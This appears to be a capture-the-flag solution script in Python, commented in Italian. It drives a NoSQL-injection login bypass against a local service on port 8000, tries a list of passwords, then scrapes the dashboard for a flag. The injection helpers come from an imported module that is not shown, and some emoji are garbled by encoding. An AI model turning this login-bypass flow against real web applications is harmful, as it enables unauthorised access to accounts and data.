import requests
from bs4 import BeautifulSoup
from exploit_utils import * 
from colorama import Fore, Style

indirizzo_servizio = "127.0.0.1"


if __name__ == "__main__":
    password = lista_password_nosql()
    while password:
        prova_password = password.pop()
        session = login_nosql_injection(prova_password)
        if session:
            print("üîó Testiamo l'accesso alla dashboard...")

            # Richiedi la dashboard
            response = session.get(f'http://{indirizzo_servizio}:8000/dashboard')

            # Usa BeautifulSoup per il parsing dell'HTML
            soup = BeautifulSoup(response.text, 'html.parser')

            # Cerca la flag nel contenuto della pagina (esempio: nel div con id="flag-container")
            flag_container = soup.find(id='flag-container')

            if flag_container:
                print(f"üü¢ Hai trovato la tua flagüéâ: {Fore.GREEN}{flag_container.text.strip()}{Style.RESET_ALL}")
                scrivi_flag_file(flag_container.text.strip())
                break  # Esci dal ciclo se la flag √® trovata
            else:
                print("‚ö†Ô∏è Flag non trovata nella pagina HTML.")